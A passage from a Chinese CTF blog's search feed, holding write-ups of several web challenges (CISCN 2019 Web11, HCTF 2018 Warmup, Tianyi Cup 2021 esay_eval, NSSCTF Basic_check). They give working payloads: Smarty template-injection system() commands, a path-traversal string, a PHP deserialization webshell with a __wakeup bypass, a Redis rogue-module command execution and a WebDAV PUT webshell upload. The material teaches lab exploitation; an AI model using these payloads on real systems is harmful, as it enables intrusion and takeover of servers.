src="https://s2.loli.net/2022/05/14/vMqDcdxHNBa7Elk.png"></p><p>因为构造了1.jpg的extension为空，所以现在是修改的文件名  可以加上.jpg  相当于修改了后缀名</p><p><img src="https://s2.loli.net/2022/05/14/IPXl5gRZwC6SOQB.png"></p><p>此时就修改成功了</p><p><img src="https://s2.loli.net/2022/05/14/Eqd9gVIjz4HfpsD.png"></p><p>直接蚁剑连接查看根目录  找到flag</p><p><img src="https://s2.loli.net/2022/05/14/GDQ7UjInrPekgJw.png"></p><p>此题目就到此结束   我们也可以去查看upload文件下  发现是修改的第二次我们上传的带有木马的1.jpg</p><p><img src="https://s2.loli.net/2022/05/14/yWXiVIGUQx6ackd.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 代码审计 </tag>
            
            <tag> 二次注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN 2019华东南Web11</title>
      <link href="/2022/05/14/CISCN2019_Web11/"/>
      <url>/2022/05/14/CISCN2019_Web11/</url>
      
        <content type="html"><![CDATA[<p>拿到题目  我只看见满屏的IP  </p><p><img src="https://s2.loli.net/2022/05/14/A6CEuG9DUd2KMXk.png"></p><p>第一时间想到这道题与IP有关系 打开我们的hackbar尝试修改X-Forwarded-For的值  发现右上角有了变化</p><p><img src="https://s2.loli.net/2022/05/14/8tKpH5VEjrN6AlB.png"></p><p><img src="https://s2.loli.net/2022/05/14/SQUjBWb8qmTc4vN.png"></p><p>尝试获取根目录下文件</p><pre><code>&#123;system(&#39;ls&#39;)&#125;</code></pre><p>右上角出现回显</p><p><img src="https://s2.loli.net/2022/05/14/ub1EKCRpGHVN9fi.png"></p><p>为了方便我们burp抓一下包  直接定位到我们需要的位置</p><p><img src="https://s2.loli.net/2022/05/14/xb2dZCHcheVUKzS.png"></p><p>尝试各种读取  发现都没有flag</p><ul><li>X-Forwarded-For:{system(‘cat &#x2F;api’)}</li><li>X-Forwarded-For:{system(‘cat &#x2F;css’)}</li><li>X-Forwarded-For:{system(‘cat &#x2F;index.php’)}</li><li>X-Forwarded-For:{system(‘cat &#x2F;smarty’)}</li><li>X-Forwarded-For:{system(‘cat &#x2F;templates_c’)}</li><li>X-Forwarded-For:{system(‘cat &#x2F;xff’)}</li></ul><p>于是根据做题经验，我们盲猜！flag在根目录  很快就找到了flag</p><pre><code>&#123;system(&#39;cat ../../../flag&#39;)&#125;或者&#123;system(&#39;cat /flag*&#39;)&#125;</code></pre><p><img src="https://s2.loli.net/2022/05/14/irAJaCpnRwWljFm.png"></p><p>第二种解法偶尔会出现牛鬼蛇神fl0g就找不到 建议还是老老实实去根目录找</p><p><img src="https://s2.loli.net/2022/05/14/4udCAWSvlmBospQ.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HCTF 2018 Warmup</title>
      <link href="/2022/05/14/HCTF2018_Warmup/"/>
      <url>/2022/05/14/HCTF2018_Warmup/</url>
      
        <content type="html"><![CDATA[<p>进入题目只有一个滑稽  我们直接F12看源码发现有一个非常明显的提示 我们直接访问source.php</p><p><img src="https://s2.loli.net/2022/05/14/UJPSW2dD8os1lG5.png"></p><p>得到源码</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">emmm</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"source"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"source.php"</span><span class="token punctuation">,</span><span class="token string">"hint"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$_page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>新的提示！hint.php直接访问 （这也太直白了hhh）</p><p><img src="https://s2.loli.net/2022/05/14/SIdFDHzUeRYuQpa.png" alt="image.png"></p><p>我们继续代码审计，下面这段代码的意思是source.php接收一个file参数，当file这个参数满足以下三个条件时返回file指定的文件，否则输出一张图片。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>file参数不为空</li><li>file参数是一个string类型</li><li>file参数能够通过checkFile的检验</li></ol><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"source"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"source.php"</span><span class="token punctuation">,</span><span class="token string">"hint"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//设定白名单</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//如果file不存在或非字符串，输出"you can't see it"并返回false。</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token comment" spellcheck="true">//如果file参数在白名单中，返回true。访问 source.php?file=source.php 可以看到输出了两次页面源码，证明在这里返回了true。</span><span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//上下部分完全相同</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$_page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这段代码在 <em>$_page &#x3D; urldecode($page);</em> 上下的部分都是完全一样的，只是为了防止用户传参时符号被urlencode而无法解析。它的作用是在用户传的file中，从开始截取到第一个问号处（不含问号），如果file中不存在问号，就在file后加一个。将截取后的字符串再与白名单做对比，如果可以就返回true。</p><p>我们可以可以通过访问 <em>source.php?file&#x3D;source.php?</em> 来进行验证，这时可以看到页面源码只输出了一次，但并没有输出”you can’t see it”，证明白名单检验通过，但source.php?这个文件是不存在的，所以没有任何输出</p><p>那么我们就可以利用这里来访问到根目录下的ffffllllaaaagggg</p><p>直接构造payload:</p><pre><code>sosource.php?file=source.php?/../../../../ffffllllaaaagggg</code></pre><p>在source.php?后加一个”&#x2F;“这时source.php会被视为一个文件夹，后面每一级的”..”意为上一层文件夹，通过不断尝试加入”..&#x2F;“最后可以知道具体的目录层级，以访问到ffffllllaaaagggg。</p><p><img src="https://s2.loli.net/2022/05/14/DrqKcUvBheYSZIk.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>天翼杯2021 esay_eval</title>
      <link href="/2022/05/11/esay_eval/"/>
      <url>/2022/05/11/esay_eval/</url>
      
        <content type="html"><![CDATA[<p>题目源码：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__call</span><span class="token punctuation">(</span><span class="token variable">$method</span><span class="token punctuation">,</span><span class="token variable">$args</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'poc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">'/"[BA]":(.*?):/s'</span><span class="token punctuation">,</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'poc'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$i</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"you want to bypass wakeup ? no !"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'poc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上来是个简单（bushi）的反序列化拿shell，但是A类里面的<code>__wakeup()</code>函数会把我们传进去的<code>$code</code>属性置为空，这里我们只需要让<code>__wakeup()</code>函数失效，CVE-2016-7124:当反序列化字符串中，表示属性个数的值大于真实属性个数时，会绕过 __wakeup 函数的执行。(也可上b站看<a href="https://www.bilibili.com/video/BV1Z54y1U7up?spm_id_from=333.880.my_history.page.click">视频学习</a>）</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">a</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span> <span class="token operator">=</span> <span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">B</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">code</span> <span class="token operator">=</span> <span class="token string">'eval($_POST[1]);'</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到了payload：?poc&#x3D;O:1:”B”:1:{s:1:”a”;O:1:”a”:2:{s:4:”code”;s:16:”eval($_POST[1]);”;}}直接不犹豫连接蚁剑.当我们以为就此结束可以拿到flag我们点击根目录发现这个shell没有访问权限，但是在&#x2F;var&#x2F;www&#x2F;html中有上传权限，所以可以通过上传恶意的so文件，通过蚁剑的redis管理插件，进行ssrf，然后包含恶意so文件（提供一<a href="https://github.com/Dliv3/redis-rogue-server">下载地址</a>）</p><p><img src="https://s2.loli.net/2022/05/11/jnw9QXU8NWF5eK1.png" alt="image.png"></p><p><strong>注</strong>：因为插件市场这个东西，国内基本是访问不到，我在用蚁剑访问的时候，就一直转圈圈转不出来，所以可以使用github的插件仓库下载插件，然后手动放到<strong>antSword-master&#x2F;antData&#x2F;pulgins</strong>中，再次打开蚁剑后，会自动加载该插件（或者科学上网）</p><p>我们上传一个exp.so文件</p><p><img src="https://s2.loli.net/2022/05/11/hBI54UzwPbXysgo.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/05/11/39SgHdzWhoZRnEJ.png" alt="image.png"></p><p>密码是根据&#x2F;var&#x2F;www&#x2F;html中有个config.php.swp文件，其中有密码</p><p><img src="https://s2.loli.net/2022/05/11/pcECsYOIgrRfPv5.png" alt="image.png"></p><p><img src="https://s2.loli.net/2022/05/11/4w9d3VIzTHDgM1x.png" alt="image.png"></p><p>然后执行指令</p><p><img src="https://s2.loli.net/2022/05/11/8CGLhlsyeDYir3N.png" alt="image.png"></p><pre><code>MODULE LOAD /var/www/html/exp.sosystem.exec &quot;whoami&quot;</code></pre><p>这里我们发现是root权限</p><p><img src="https://s2.loli.net/2022/05/11/lAhN2fa8yWSCPwk.png" alt="image.png"></p><p>直接看根目录   然后找到flag</p><pre><code>system.exec &quot;ls /&quot;system.exec &quot;cat /flag*&quot;</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF Round#1 Basic_check</title>
      <link href="/2022/05/10/NSSCTF-Round1/"/>
      <url>/2022/05/10/NSSCTF-Round1/</url>
      
        <content type="html"><![CDATA[<p>第一次拿到web题的一血还是有点小激动的（借助了一下同队<a href="http://www.mufengnet.ltd/">暮渢</a>的思路hhh）</p><p>原题目来自<a href="https://www.ctfer.vip/">NSSCTF</a></p><p>首先我们拿到题目</p><p><img src="https://s2.loli.net/2022/05/11/KzXjMAuH1xte4qF.png"></p><p>然后我们尝试按F12寻找思路，好的发现什么也没有，然后我就识图通过dirsearch查询是否有其他可以访问的网站地址</p><pre class="line-numbers language-python"><code class="language-python">python3 direarch<span class="token punctuation">.</span>py <span class="token operator">-</span>u http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">1.14</span><span class="token punctuation">.</span><span class="token number">71.254</span><span class="token punctuation">:</span><span class="token number">28</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://s2.loli.net/2022/05/11/SBpoW9yJdFwNOeH.png"></p><p>两个都是主页 我们直接进入kali虚拟机  通过nikto扫一下</p><p><img src="https://s2.loli.net/2022/05/11/zGf4tuhqJPogBxe.png"></p><p>漫长的等待  仔细看我们会发现</p><p><img src="https://s2.loli.net/2022/05/11/QLxgi9qsUAVCoE5.png"></p><p>这个网站可以通过PUT方法  直接用firefox的扩展RESTClient</p><p><img src="https://s2.loli.net/2022/05/11/RQBpWHYCm4vqP1e.png"> </p><p>上传成功，访问发现正常解析 直接蚁剑连接  在根目录下找到flag</p><p><img src="https://s2.loli.net/2022/05/11/codtSCpQWwhLFg9.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> DAV </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
